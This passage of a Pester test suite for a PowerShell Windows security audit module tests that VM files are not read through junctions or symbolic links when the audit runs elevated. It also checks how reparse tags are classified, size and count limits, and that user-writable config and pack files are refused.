            Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
            $f = @(Invoke-CEAuditCore -Id 'FW-07')
            @($f | ForEach-Object Status) | Should -Be @('Manual') -Because 'a VM on a share may be bridged'
            $f[0].Recommendation | Should -Match 'local fixed drive'
            $f[0].Recommendation | Should -Not -Match 'without elevation' -Because "the user's own session does not open it either"
        }

        It 'reads VM inventories only through plain folders and up to a size limit' {
            # A plain inventory is read. Its VM file is below the profile, so the folders checked on the
            # way are the fixture's, not those of this machine's TEMP.
            $plain = Join-Path $TestDrive 'vm-plain'
            $vmx = Join-Path $plain 'VMs\lab.vmx'
            New-Item -ItemType Directory -Force -Path (Join-Path $plain 'AppData\Roaming\VMware'), (Split-Path -Parent $vmx) | Out-Null
            Set-Content -LiteralPath $vmx -Value 'displayName = "Lab"'
            $line = "vmlist1.config = `"$vmx`""
            Set-Content -LiteralPath (Join-Path $plain 'AppData\Roaming\VMware\inventory.vmls') -Value $line
            # One reached through a junction the user made is not.
            $linked = Join-Path $TestDrive 'vm-linked'
            New-Item -ItemType Directory -Force -Path (Join-Path $linked 'AppData\Roaming'), (Join-Path $TestDrive 'vm-target') | Out-Null
            Set-Content -LiteralPath (Join-Path $TestDrive 'vm-target\inventory.vmls') -Value $line
            $link = Join-Path $linked 'AppData\Roaming\VMware'
            New-Item -ItemType Junction -Path $link -Target (Join-Path $TestDrive 'vm-target') | Out-Null
            # And one over 1 MB is not read at all.
            $big = Join-Path $TestDrive 'vm-big'
            New-Item -ItemType Directory -Force -Path (Join-Path $big 'AppData\Roaming\VMware') | Out-Null
            [IO.File]::WriteAllText((Join-Path $big 'AppData\Roaming\VMware\inventory.vmls'), ($line + "`r`n" + ('#' * (1MB + 16))))
            try {
                InModuleScope CEAudit -Parameters @{ Plain = $plain; Linked = $linked; Big = $big } {
                    param($Plain, $Linked, $Big)
                    $vms = Get-CEVMwareMachine -ProfilePath $Plain
                    @($vms).Count | Should -Be 1
                    $vms = Get-CEVMwareMachine -ProfilePath $Linked
                    @($vms).Count | Should -Be 0 -Because 'the VMware folder is a junction'
                    $vms = Get-CEVMwareMachine -ProfilePath $Big
                    @($vms).Count | Should -Be 0 -Because 'the inventory is over the size limit'
                }
            }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }

        It 'treats only junctions and symbolic links as links, not downloaded cloud files' {
            InModuleScope CEAudit {
                $hex = { param($h) [Convert]::ToInt64($h, 16) }
                $script:testTag = [long]0
                Mock Get-CEReparseTag { $script:testTag }
                # Attributes as numbers: FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS is not in .NET's FileAttributes.
                $item = { param($attrs) [pscustomobject]@{ Attributes = [long]$attrs; FullName = 'C:\x\lab.vmx'; Name = 'lab.vmx' } }
                Get-CEReparseKind (& $item 0x20) | Should -Be 'none' -Because 'not a reparse point'
                Get-CEReparseKind (& $item -1) | Should -Be 'none' -Because 'an item that is not there has attributes -1'
                $cases = [ordered]@{
                    'a junction'                           = @{ Tag = (& $hex 'A0000003'); Kind = 'junction' }
                    'a symbolic link'                      = @{ Tag = (& $hex 'A000000C'); Kind = 'symlink' }
                    'a WSL symbolic link'                  = @{ Tag = (& $hex 'A000001D'); Kind = 'surrogate' }
                    'a downloaded OneDrive or Proton file' = @{ Tag = (& $hex '9000601A'); Kind = 'reparse' }
                    'a deduplicated file'                  = @{ Tag = (& $hex '80000013'); Kind = 'reparse' }
                    'a tag that cannot be read'            = @{ Tag = [long]-1; Kind = 'unreadable' }
                }
                foreach ($k in $cases.Keys) {
                    $script:testTag = [long]$cases[$k].Tag
                    Get-CEReparseKind (& $item 0x420) | Should -Be $cases[$k].Kind -Because $k
                }
                $script:testTag = & $hex '9000601A'
                Get-CEReparseKind (& $item 0x401420) | Should -Be 'cloud' -Because 'reading it would download it'
                Get-CEReparseKind (& $item 0x1020) | Should -Be 'cloud' -Because 'an offline file is not on the device'
                Get-CEReparseKind (& $item 0x40020) | Should -Be 'cloud' -Because 'a folder whose contents are fetched when it is opened'
                $script:testTag = & $hex 'A000000C'
                Get-CEReparseKind (& $item 0x401420) | Should -Be 'symlink' -Because 'a link is a link first'
            }
        }

        It 'reads the reparse tag and target of a real junction and folder without opening them' {
            Use-TestTags   # the junctions' targets are walked from the drive root: TEMP's ancestors count as plain
            $dir = Join-Path $TestDrive 'tag-real'
            New-Item -ItemType Directory -Force -Path (Join-Path $dir 'target') | Out-Null
            $j = Join-Path $dir 'junction'
            New-Item -ItemType Junction -Path $j -Target (Join-Path $dir 'target') | Out-Null
            try {
                InModuleScope CEAudit -Parameters @{ D = $dir; J = $j } {
                    param($D, $J)
                    Get-CEReparseTag $J | Should -Be ([Convert]::ToInt64('A0000003', 16))
                    Get-CEReparseKind (New-Object IO.DirectoryInfo $J) | Should -Be 'junction'
                    Get-CEReparseTag (Join-Path $D 'target') | Should -Be 0
                    Get-CEReparseTag (Join-Path $D 'missing') | Should -Be -1
                    Get-CEReparseTag (Join-Path $D 'j*') | Should -Be -1 -Because 'a wildcard would name another item'
                    Get-CEJunctionTarget $J | Should -Be ('\??\' + (Join-Path $D 'target'))
                    Get-CEJunctionTarget (Join-Path $D 'target') | Should -BeNullOrEmpty -Because 'a plain folder has no target'
                    Get-CEJunctionProblem -Path $J -Log (New-CENotReadLog) | Should -Be '' -Because 'its target is a plain folder on a local fixed drive'
                }
            }
            finally { [IO.Directory]::Delete($j) }
        }

        It 'does not read a VM file through a link on the way to it as SYSTEM or elevated, and says it found it' {
            $real = Join-Path $TestDrive 'vm-chain-real'
            New-Item -ItemType Directory -Force -Path $real | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $real 'Win.vbox') -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"/></VirtualBox>'
            $prof = Join-Path $TestDrive 'vm-chain-profile'
            New-Item -ItemType Directory -Force -Path (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            # The junction is below the profile, so only the fixture's folders are checked on the way to it.
            $via = Join-Path $prof 'vm-chain-via'
            New-Item -ItemType Junction -Path $via -Target $real | Out-Null
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$via\lab.vmx`""
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$via\Win.vbox`"/></MachineRegistry></Global></VirtualBox>"
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof; V = $via } {
                    param($P, $V)
                    $log = New-CENotReadLog
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log $log
                    @($vms).Count | Should -Be 0 -Because 'a folder on the way to the .vmx is a junction, and contents are never read through one'
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Log $log
                    @($vbox).Count | Should -Be 0 -Because 'a folder on the way to the .vbox is a junction'
                    $why = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
                    @($log.Records | ForEach-Object { "$($_.Topic)|$($_.Kind)|$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @(
                        "vm-file|file-content|%USERPROFILE%\vm-chain-via\lab.vmx|$why|True",
                        "vm-file|file-content|%USERPROFILE%\vm-chain-via\Win.vbox|$why|True")
                    # In the user's own session their links are followed.
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log (New-CENotReadLog) -Above $false
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab')
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Log (New-CENotReadLog) -Above $false
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Win')
                    # The profile folder itself may be a link: a VM file below it is checked from there.
                    $log = New-CENotReadLog
                    Read-CENamedFile -Path (Join-Path $V 'lab.vmx') -ProfilePath $V -MaxBytes 1MB -Product 'VMware' -Log $log | Should -Match 'Lab'
                    Read-CENamedFile -Path (Join-Path $V 'none\lab.vmx') -ProfilePath $V -MaxBytes 1MB -Product 'VMware' -Log $log | Should -BeNullOrEmpty
                    @($log.Records).Count | Should -Be 0 -Because 'a file that is not there is not a file not read'
                }
            }
            finally { [IO.Directory]::Delete($via) }
        }

        It 'checks every folder from the drive root for a VM file outside the profile' {
            # The .vmx is at outside\via\lab.vmx, where via is a junction, and the inventory is in another
            # folder, so the check starts at the drive root. A folder above TestDrive, flagged as a symbolic
            # link, shows the walk really starts at the root.
            $outside = Join-Path $TestDrive 'outside'
            $real = Join-Path $TestDrive 'outside-real'
            $prof = Join-Path $TestDrive 'outside-profile'
            New-Item -ItemType Directory -Force -Path $outside, $real, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $outside 'plain.vmx') -Value 'displayName = "Plain"'
            $via = Join-Path $outside 'via'
            New-Item -ItemType Junction -Path $via -Target $real | Out-Null
            $vmx = Join-Path $via 'lab.vmx'
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$vmx`"", "vmlist2.config = `"$(Join-Path $outside 'plain.vmx')`"")
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof; F = $vmx; O = $outside; V = $via; Up = (Split-Path -Parent ([string]$TestDrive)) } {
                    param($P, $F, $O, $V, $Up)
                    $why = 'a junction or symbolic link on the way is not followed when reading file contents above the user''s rights'
                    # What each folder is comes from this mock, not from this machine: only via is a junction, and the
                    # folder above TestDrive is a symbolic link once testFlagUp is set. TEMP's real ancestors never matter.
                    $script:testUp = $Up.TrimEnd('\')
                    $script:testVia = $V.TrimEnd('\')
                    $script:testFlagUp = $false
                    Mock Get-CEReparseKind {
                        $n = ([string]$Item.FullName).TrimEnd('\') -replace '^\\\\\?\\', ''
                        if ($script:testFlagUp -and $n -eq $script:testUp) { 'symlink' } elseif ($n -eq $script:testVia) { 'junction' } else { 'none' }
                    }
                    $log = New-CENotReadLog
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log $log
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Plain') -Because 'a folder on the way from the drive root is a junction'
                    @($log.Records | ForEach-Object { "$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @("$F|$why|True") -Because 'outside the profile, the path is shown as the inventory names it'
                    # A folder above TestDrive that is a link stops the walk too: it starts at the drive root, not at the file.
                    $script:testFlagUp = $true
                    $log = New-CENotReadLog
                    Read-CENamedFile -Path (Join-Path $O 'plain.vmx') -ProfilePath $P -MaxBytes 1MB -Product 'VMware' -Log $log | Should -BeNullOrEmpty
                    @($log.Records | ForEach-Object { $_.Reason }) | Should -Be @($why)
                    # In the user's own session their links are followed.
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log (New-CENotReadLog) -Above $false
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab', 'Plain')
                }
            }
            finally { [IO.Directory]::Delete($via) }
        }

        It 'reports a VM file too large to read as not read, with advice other than the user''s session' {
            $prof = Join-Path $TestDrive 'vm-big-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            $big = Join-Path $dir 'big.vmx'
            [IO.File]::WriteAllBytes($big, (New-Object byte[] (1MB + 16)))
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$big`""
            $line = '%USERPROFILE%\VMs\big.vmx (file not read): it is larger than 1 MB'
            $states = InModuleScope CEAudit -Parameters @{ P = $prof } {
                param($P)
                $script:testVmProfile = $P
                Mock Get-CEUserProfilePath { $script:testVmProfile }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                Mock Get-CEContainer { , @() }
                Mock Resolve-CEDockerPath { [pscustomobject]@{ Path = ''; Refused = @() } }
                Mock Get-CEVirtualisationListener { , @() }
                [pscustomobject]@{
                    User     = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
                    Elevated = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                }
            }
            foreach ($k in 'User', 'Elevated') {
                $st = $states.$k
                @($st.VMware).Count | Should -Be 0
                @($st.Notes).Count | Should -Be 0
                @($st.NotRead | ForEach-Object { InModuleScope CEAudit -Parameters @{ R = $_ } { param($R) Format-CENotRead $R } }) | Should -Be @($line) -Because "$k reports it"
                @($st.NotRead | Where-Object { $_.NeedsUserSession }).Count | Should -Be 0 -Because "$k skips it for its size, not for the user's rights"
                Set-TestDevice -Kind Secure
                $global:CETestVirt = $st
                Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
                foreach ($id in 'FW-07', 'SC-12') {
                    $f = @(Invoke-CEAuditCore -Id $id)
                    $f[0].Status | Should -Be 'Manual' -Because "$k $id reports the file rather than no virtual machines"
                    $f[0].Actual | Should -Match ([regex]::Escape($line))
                    $f[0].Recommendation | Should -Not -Match 'Invoke-CEUserProbe|per-user probe|elevated or SYSTEM audit|elevated prompt' -Because "$k $id"
                    $f[0].Recommendation | Should -Match 'at most 1 MB'
                }
            }
        }

        It 'reads at most maxVmFilesPerInventory VM files as SYSTEM or elevated, and says so' {
            $prof = Join-Path $TestDrive 'vm-cap-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            $lines = foreach ($i in 1..3) {
                $f = Join-Path $dir "vm$i.vmx"
                Set-Content -LiteralPath $f -Value "displayName = `"VM$i`""
                "vmlist$i.config = `"$f`""
            }
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value $lines
            $entries = foreach ($i in 1..3) {
                $f = Join-Path $dir "box$i.vbox"
                Set-Content -LiteralPath $f -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Machine name=`"Box$i`"/></VirtualBox>"
                "<MachineEntry uuid=`"{$i}`" src=`"$f`"/>"
            }
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry>$($entries -join '')</MachineRegistry></Global></VirtualBox>"
            InModuleScope CEAudit -Parameters @{ P = $prof } {
                param($P)
                $orig = (Get-CEConfig)['virtualisation']
                try {
                    (Get-CEConfig)['virtualisation'] = [pscustomobject]@{ maxVmFilesPerInventory = 2 }
                    $why = "the audit reads at most 2 virtual machine files named in one inventory above the user's rights"
                    $log = New-CENotReadLog
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log $log
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('VM1', 'VM2')
                    @($log.Records | ForEach-Object { "$($_.Topic)|$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)|$($_.Remedy)" }) |
                        Should -Be @("vm-file|%USERPROFILE%\AppData\Roaming\VMware\inventory.vmls|$why|True|Or raise maxVmFilesPerInventory in virtualisation.json.")
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log (New-CENotReadLog) -Above $false
                    @($vms).Count | Should -Be 3 -Because "the limit is for audits with more rights than the user"
                    $log = New-CENotReadLog
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Log $log
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Box1', 'Box2')
                    @($log.Records | ForEach-Object { "$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @("%USERPROFILE%\.VirtualBox\VirtualBox.xml|$why|True")
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Log (New-CENotReadLog) -Above $false
                    @($vbox).Count | Should -Be 3
                    (Get-CEConfig)['virtualisation'] = [pscustomobject]@{}
                    Get-CEVmFileCap | Should -Be 64
                }
                finally { (Get-CEConfig)['virtualisation'] = $orig }
            }
            (Get-Content (Join-Path $script:RepoRoot 'config\virtualisation.json') -Raw | ConvertFrom-Json).maxVmFilesPerInventory | Should -Be 64
        }

        It 'reports a VM file stored online only as found, not read, when elevated' {
            $prof = Join-Path $TestDrive 'vm-cloud-profile'
            $dir = Join-Path $prof 'VMs'
            New-Item -ItemType Directory -Force -Path $dir, (Join-Path $prof 'AppData\Roaming\VMware') | Out-Null
            $cloud = Join-Path $dir 'cloud.vmx'
            $local = Join-Path $dir 'local.vmx'
            Set-Content -LiteralPath $cloud -Value @('displayName = "Cloud"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath $local -Value 'displayName = "Local"'
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$cloud`"", "vmlist2.config = `"$local`"")
            # FILE_ATTRIBUTE_OFFLINE, one of the attributes of a file a sync app keeps online only; any account may set it.
            [IO.File]::SetAttributes($cloud, [IO.FileAttributes]::Offline)
            InModuleScope CEAudit -Parameters @{ P = $prof } {
                param($P)
                $script:testVmProfile = $P
                Mock Get-CEUserProfilePath { $script:testVmProfile }
                Mock Get-CEWslDistribution { , @() }
                Mock Get-CEHyperVMachine { [pscustomobject]@{ Readable = $true; Message = ''; Machines = @(); NatMappings = @() } }
                Mock Get-CEContainer { , @() }
                Mock Resolve-CEDockerPath { [pscustomobject]@{ Path = ''; Refused = @() } }
                Mock Get-CEVirtualisationListener { , @() }
                $st = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $true })
                @($st.VMware | ForEach-Object { $_.Name }) | Should -Be @('Local')
                @($st.NotRead | ForEach-Object { "$($_.Location)|$($_.Reason)|$($_.NeedsUserSession)" }) | Should -Be @('%USERPROFILE%\VMs\cloud.vmx|it is stored online only, and an elevated or SYSTEM audit does not download it|True')
                # The user's own session reads it (their sync app downloads it for them, as it would anyway).
                $st = Get-CEVirtualisationStateUncached -Context ([pscustomobject]@{ IsSystem = $false; IsElevated = $false })
                @($st.VMware | ForEach-Object { $_.Name } | Sort-Object) | Should -Be @('Cloud', 'Local')
                @($st.NotRead).Count | Should -Be 0
            }
        }

        It 'reads VM files through a cloud-synced folder, a reparse point that is not a link' {
            # With Known Folder Move, Documents\Virtual Machines is below a OneDrive folder, and every folder
            # there is a reparse point with a cloud tag. A test can't make one, so a junction stands in for
            # it, with Get-CEReparseTag giving its tag.
            $prof = Join-Path $TestDrive 'vm-cloudfolder-profile'
            $real = Join-Path $TestDrive 'vm-cloudfolder-real'
            New-Item -ItemType Directory -Force -Path $real, (Join-Path $prof 'AppData\Roaming\VMware'), (Join-Path $prof '.VirtualBox') | Out-Null
            Set-Content -LiteralPath (Join-Path $real 'lab.vmx') -Value 'displayName = "Lab"'
            Set-Content -LiteralPath (Join-Path $real 'Win.vbox') -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"/></VirtualBox>'
            $cloud = Join-Path $prof 'Documents'
            New-Item -ItemType Junction -Path $cloud -Target $real | Out-Null
            Set-Content -LiteralPath (Join-Path $prof 'AppData\Roaming\VMware\inventory.vmls') -Value "vmlist1.config = `"$cloud\lab.vmx`""
            Set-Content -LiteralPath (Join-Path $prof '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$cloud\Win.vbox`"/></MachineRegistry></Global></VirtualBox>"
            try {
                InModuleScope CEAudit -Parameters @{ P = $prof } {
                    param($P)
                    $script:testTag = [Convert]::ToInt64('9000601A', 16)
                    Mock Get-CEReparseTag { $script:testTag }
                    $log = New-CENotReadLog
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log $log
                    @($vms | ForEach-Object { $_.Name }) | Should -Be @('Lab')
                    $vbox = Get-CEVirtualBoxMachine -ProfilePath $P -Log $log
                    @($vbox | ForEach-Object { $_.Name }) | Should -Be @('Win')
                    @($log.Records).Count | Should -Be 0
                    # The same folder as a real junction is not followed for contents, even to a local folder.
                    $script:testTag = [Convert]::ToInt64('A0000003', 16)
                    $vms = Get-CEVMwareMachine -ProfilePath $P -Log $log
                    @($vms).Count | Should -Be 0
                    @($log.Records).Count | Should -Be 1
                }
            }
            finally { [IO.Directory]::Delete($cloud) }
        }

        It 'decides what is a link only in Get-CEReparseKind' {
            # Any reparse point counting as a link dropped VM files and extensions in cloud-synced folders.
            # A file stored online only can't be made in a test, so this is the guard for Read-CEBoundedText.
            $problems = foreach ($file in Get-ChildItem (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') -Filter *.ps1 -Recurse) {
                $ast = [System.Management.Automation.Language.Parser]::ParseFile($file.FullName, [ref]$null, [ref]$null)
                foreach ($fn in $ast.FindAll({ $args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
                    if ($fn.Name -ne 'Get-CEReparseKind' -and $fn.Body.Extent.Text -match 'ReparsePoint|0x441000') { "$($file.Name): $($fn.Name)" }
                }
            }
            @($problems) -join "`n" | Should -BeNullOrEmpty
        }

        It 'treats every kind but none as a link when deciding whether to trust the data folder' {
            # Profile reads read a cloud-synced folder normally. SYSTEM trust decisions about the data
            # folder take the strict reading of the same Get-CEReparseKind answer.
            $plain = Join-Path $TestDrive 'dl-plain'
            $target = Join-Path $TestDrive 'dl-target'
            $link = Join-Path $TestDrive 'dl-link'
            New-Item -ItemType Directory -Path $plain, $target -Force | Out-Null
            Set-Content -LiteralPath (Join-Path $target 'keep.txt') -Value 'x'
            New-Item -ItemType Junction -Path $link -Target $target | Out-Null
            try {
                InModuleScope CEAudit -Parameters @{ Plain = $plain; Link = $link } {
                    param($Plain, $Link)
                    Test-CEDataLink -Path $Plain | Should -BeFalse
                    Test-CEDataLink -Path (Join-Path $Plain 'missing') | Should -BeFalse
                    Test-CEDataLink -Path $Link | Should -BeTrue
                    foreach ($kind in 'junction', 'symlink', 'surrogate', 'unreadable', 'cloud', 'reparse') {
                        Mock Get-CEReparseKind { $kind }.GetNewClosure()
                        Test-CEDataLink -Path $Plain | Should -BeTrue -Because "$kind is not a plain folder"
                    }
                    Mock Get-CEReparseKind { 'none' }
                    Test-CEDataLink -Path $Plain | Should -BeFalse
                }
            }
            finally { [IO.Directory]::Delete($link, $false) }
            Test-Path -LiteralPath (Join-Path $target 'keep.txt') | Should -BeTrue
        }
    }

    Context 'firmware catalog record validation' {
        It 'rejects records missing a version on any release, and SU-08 does not throw on odd records' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $good = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ version = '1.1' }) }
                Test-CEFirmwareCatalogRecord $good 'dell' '0CF1' | Should -BeTrue
                $bad = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ date = '2026-01-01' }) }
                Test-CEFirmwareCatalogRecord $bad 'dell' '0CF1' | Should -BeFalse -Because 'the second release has no version'

                # A record that slips through with a missing name / date must not throw.
                $hw = [pscustomobject]@{ Manufacturer = 'Dell'; Model = 'X'; Firmware = [pscustomobject]@{ Version = '1.0' } }
                $rec = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '9.9'; criticality = 'Urgent' }) }
                Mock Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Found'; Record = $rec; FromCache = $false; Message = ''; Key = $null } }
                $ev = New-Object System.Collections.ArrayList
                [void]$ev.Add('hardware evidence')  # SU-08 always adds hardware lines before calling
                { Get-CEFirmwareCatalogResult -Context (New-TestContext) -Hardware $hw -Evidence $ev } | Should -Not -Throw
            }
        }
    }

    Context 'strict-mode config reads survive partial overrides' {
        It 'NC-08 is Manual, not Error, when secure-boot.json is missing sections' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'secure-boot'
                try {
                    (Get-CEConfig).'secure-boot' = [pscustomobject]@{ eventLookbackDays = 30 }  # no events, no certificates
                    $f = @(Invoke-CEAuditCore -Id 'NC-08')
                    @($f | Where-Object Status -eq 'Error').Count | Should -Be 0
                    ($f | Where-Object Subject -eq '').Status | Should -Be 'Manual'
                }
                finally { (Get-CEConfig).'secure-boot' = $orig }
            }
        }

        It 'SU-08 TPM advisories survive an advisory missing fields' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'tpm-firmware-advisories'
                try {
                    (Get-CEConfig).'tpm-firmware-advisories' = [pscustomobject]@{ lastReviewed = '2026-01-01'; advisories = @([pscustomobject]@{ manufacturers = @('IFX'); affected = @([pscustomobject]@{ from = '1.0'; to = '9.0' }) }) }
                    { @(Invoke-CEAuditCore -Id 'SU-08') } | Should -Not -Throw
                }
                finally { (Get-CEConfig).'tpm-firmware-advisories' = $orig }
            }
        }
    }

    Context 'pack parent-directory ACL' {
        It 'rejects a ProgramData pack when only its parent folder is user-writable' {
            $data = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            New-Item -ItemType Directory -Force -Path (Join-Path $data 'packs\mypack') | Out-Null
            Set-Content -LiteralPath (Join-Path $data 'packs\mypack\pack.json') -Value '{ "id": "mypack", "name": "My pack", "version": "1.0.0" }'
            try {
                InModuleScope CEAudit -Parameters @{ Data = $data } {
                    param($Data)
                    $script:CEDataRootOverride = $Data
                    $parent = Join-Path $Data 'packs'
                    # Only the parent folder is flagged as writable; the pack folder itself is clean.
                    Mock Get-CEPathAclProblem { if ($Path -eq $parent) { "$Path is writable by S-1-5-32-545" } else { @() } }
                    $pack = @(Get-CEPackCandidate | Where-Object { $_.Id -eq 'mypack' })
                    $pack.Count | Should -Be 1
                    $pack[0].Status | Should -Be 'Skipped'
                    $pack[0].Reason | Should -Match 'non-administrators could change it'
                    Should -Invoke Get-CEPathAclProblem -ParameterFilter { $Path -eq $parent } -Times 1 -Because 'the parent directory is checked'
                }
            }
            finally { InModuleScope CEAudit { $script:CEDataRootOverride = $null } }
        }
    }

    Context 'data-path trust when elevated' {
        It 'trusts any path when not elevated' {
            InModuleScope CEAudit {
                Mock Test-CEIsAdmin { $false }
                Mock Get-CEPathAclProblem { @('writable by everyone') }
                Test-CEDataPathTrusted -Path 'C:\whatever' | Should -BeTrue -Because 'a non-elevated audit only affects its own user'
            }
        }

        It 'distrusts a writable default path when elevated' {
            InModuleScope CEAudit {
                Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { @('C:\ProgramData\... is writable by S-1-5-32-545') }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeFalse
                Mock Get-CEPathAclProblem { @() }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeTrue
            }
        }

        It 'loads a config override when elevated only if the data folder, the config folder and the file are admin-only' {
            # A file keeps the owner who created it, so a file a standard user dropped into the config
            # folder before it was locked must be refused on its own, as pack files are.
            $data = Join-Path $TestDrive 'per-file-override'
            $cfgDir = Join-Path $data 'config'
            New-Item -ItemType Directory -Force -Path $cfgDir | Out-Null
            Set-Content -LiteralPath (Join-Path $cfgDir 'firmware-catalog.json') -Value '{ "baseUrl": "https://catalog.example.com" }'
            Set-Content -LiteralPath (Join-Path $cfgDir 'network.json') -Value '{ "proxyUrl": "http://proxy.contoso.com:3128" }'
            Set-Content -LiteralPath (Join-Path $cfgDir 'thresholds.jsonbak') -Value '{ "not": "config" }'
            $global:TestOverrideRoot = $data
            InModuleScope CEAudit -Parameters @{ Data = $data } {
                param($Data)
                $script:CEDataRootOverride = $Data
                try {
                    Mock Test-CEIsAdmin { $true }
                    Mock Get-CEPathAclProblem { if ($Path -like '*firmware-catalog.json') { @("$Path is owned by S-1-5-21-1-2-3-1001") } }
                    Get-CEConfig -Force -WarningVariable warned -WarningAction SilentlyContinue | Out-Null
                    (Get-CEConfig).'firmware-catalog'.baseUrl | Should -Be 'https://baseline.engramic.ai' -Because 'a user-owned file is refused'
                    (Get-CEConfig).network.proxyUrl | Should -Be 'http://proxy.contoso.com:3128' -Because 'an admin-only file beside it still loads'
                    ($warned -join ' ') | Should -Match 'firmware-catalog\.json'
                    Should -Invoke Get-CEPathAclProblem -ParameterFilter { $Path -like '*network.json' }
                    Should -Invoke Get-CEPathAclProblem -Times 0 -Exactly -ParameterFilter { $Path -like '*.jsonbak' } -Because 'only .json files are config'
                    (Get-CEConfig).Keys | Should -Not -Contain 'thresholds.jsonbak'

                    Mock Get-CEPathAclProblem { if ($Path -eq $global:TestOverrideRoot) { @("$Path is owned by S-1-5-21-1-2-3-1001") } }
                    Get-CEConfig -Force -WarningAction SilentlyContinue | Out-Null
                    (Get-CEConfig).network.proxyUrl | Should -Be '' -Because 'whoever owns the data folder could replace the config folder'

                    Mock Get-CEPathAclProblem { }
